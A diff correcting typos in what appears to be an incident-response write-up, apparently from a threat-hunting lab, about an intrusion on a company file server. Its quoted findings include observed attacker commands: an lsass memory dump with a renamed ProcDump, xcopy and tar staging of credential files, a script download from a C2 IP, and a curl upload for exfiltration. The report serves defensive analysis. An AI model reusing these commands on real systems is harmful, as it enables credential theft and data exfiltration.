@@ -31,10 +31,10 @@
 - Resolved
 
 ## Incident Overview:
-- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours later at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that allign with persistence for continued privlieges and anti-forensic attempts.
+- After establishing initial access on November 19th, network monitoring detected an unauthorized entity returning approximately 72 hours later at precisely `2025-11-22T00:27:58.4166424Z`. Suspicious lateral movement and large data transfers were observed overnight on the file server. Evidence of credential collection and exfiltration of data were followed by actions that align with persistence for continued privileges and anti-forensic attempts.
 
 ## Key Findings:
-Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumuration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensve evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>
+Due to a compromised device, the unauthorized entity performed lateral movement and discovered a critical server `azuki-fileserver01` through remote share enumeration. The threat actor then continued to probe for privilege and network enumeration. They then implemented a staging directory and began steps for defensive evasion by attempting to hide the staging directory path through obfuscation. Using legitimate system utilities with network capabilities, the unauthorized entity then weaponized "Living off the Land" techniques to download a script into the staging directory.<br>
 
 The C2 IP address used to download the script `ex.ps1` was identified as `78.141.196.6` to the staging directory `C:\Windows\Logs\CBS\`. Credential file discovery was used for collection and created the file `IT-Admin-Passwords.csv` within the staging directory. The built-in system utility "xcopy.exe" was used in attempt to reduce the chance of detection of security alerts to stage data from the network share `"xcopy.exe" C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y`. The compression tool "tar.exe", which is not native to legacy Windows environments, then was utilized to archive collected data using the command `"tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin .`. In order to avoid signature-base detection, the credential dumping tool was renamed to `pd.exe` and the process memory dump command `"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp` performed the collection.<br>
 
@@ -51,7 +51,7 @@ Exfiltration steps were then initiated by `"curl.exe" -F file=@C:\Windows\Logs\C
 - The compromised device `azuki-fileserver01` housed sensitive employee information and has been identified as a major risk to employees. There has been a known remote accessed account `kenji.sato` that has been identified to have been compromised earlier and eventually led to this particular incident. The potential for identity theft, phishing attacks, and unauthorized access is critical.
 
 ### Business Partners:
-- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may have ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.
+- The fileserver affected by this incident has been known to hold information with business partners and company data. The unintended distribution of proprietary code or technology is concerning. There may be ramifications for business partners who rely on the integrity and exclusivity of Azuki Import/Export Trading CO., LTD.
 
 ### Regulatory Bodies:
 - The breach of systems could have compliance implications. Regulatory bodies may impose fines or sanctions on Azuki Import/Export Trading CO., LTD for failing to adequately protect sensitive data. This ultimately falls on the jurisdiction and nature of the compromised data.
@@ -79,11 +79,11 @@ The remote IP `159.26.106.98` made a successful logon to the device `azuki-sl` t
 
 <img width="1968" height="498" alt="image" src="https://github.com/user-attachments/assets/ec2d9532-d6c5-46cf-b2e4-656478fc04dd" />
 
-Lateral movement was observed accross many devices which was sourced from a Remote Access Tool (RAT) with the process name `mstsc.exe`.
+Lateral movement was observed across many devices which was sourced from a Remote Access Tool (RAT) with the process name `mstsc.exe`.
 
 <img width="1781" height="553" alt="image" src="https://github.com/user-attachments/assets/74724b07-62a7-4bf4-a785-416eb6a43c1b" />
 
-Queries for the any remote sessions with successful logon attempts discovered suspicious activity involving the critical fileserver `azuki-fileserver01`.
+Queries for any remote sessions with successful logon attempts discovered suspicious activity involving the critical fileserver `azuki-fileserver01`.
 
 <img width="1816" height="488" alt="image" src="https://github.com/user-attachments/assets/fcc5792a-a78c-44de-9fa7-00a9b9c77d53" />
 
@@ -95,7 +95,7 @@ At `2025-11-22T00:40:54.8271951Z`, the initial enumeration attempts were conduct
 
 <img width="1587" height="432" alt="image" src="https://github.com/user-attachments/assets/381aee74-2986-4a2c-960a-b84ff2c934fe" />
 
-Privilege enumeration tactics continued with intent to determine what actions can be performed and whether privilege esclation is required.
+Privilege enumeration tactics continued with intent to determine what actions can be performed and whether privilege escalation is required.
 
 <img width="1529" height="397" alt="image" src="https://github.com/user-attachments/assets/1bd58659-5f3f-463e-9eb0-53a083a512b3" />
 
@@ -103,7 +103,7 @@ Network configuration enumeration actions were performed in order to scope the e
 
 <img width="1558" height="397" alt="image" src="https://github.com/user-attachments/assets/32e20007-5f59-46d0-b5ce-c22fd74fa1a0" />
 
-Modifications to file system attributes were done with the intent to hide the staging directory from users and security tools. The staging path `C:\Windows\Logs\CBS` was created and modified to organize tools and stolen data before exiltration. This directory path is directly linked to the IoC (Indicators of Compromise).
+Modifications to file system attributes were done with the intent to hide the staging directory from users and security tools. The staging path `C:\Windows\Logs\CBS` was created and modified to organize tools and stolen data before exfiltration. This directory path is directly linked to the IoC (Indicators of Compromise).
 
 <img width="1877" height="538" alt="image" src="https://github.com/user-attachments/assets/c788caaf-38fd-4a27-8e2e-6eda6d9ddf54" />
 
@@ -135,7 +135,7 @@ Credentials were extracted using a process memory dump. The correlation between 
 
 <img width="1950" height="506" alt="image" src="https://github.com/user-attachments/assets/8bc85ab9-3341-4ce2-bb92-f45347318603" />
 
-Exfiltration of data was confirmed through the usage of command-line HTTP clients that enabled scriptable data transfers. This command syntax can be added to the detections rule of the defender team. The evidence indicates that there were many transfers of varying file names which could potentially have sensitive stakeholder information.
+Exfiltration of data was confirmed through the usage of command-line HTTP clients that enabled scriptable data transfers. This command syntax can be added to the detection rules of the defender team. The evidence indicates that there were many transfers of varying file names which could potentially have sensitive stakeholder information.
 
 <img width="1973" height="472" alt="image" src="https://github.com/user-attachments/assets/ff379502-3cc9-4687-a2e0-0971ff6cafba" />
 
@@ -196,7 +196,7 @@ Anti-forensic attempts were apparent by the deletion of the PowerShell history f
 ## System Patching:
 ### Vulnerability Identification:
 ### Patch Management:
-### Fallback Proceedures:
+### Fallback Procedures:
 
 # Recovery Steps
 ## Data Restoration
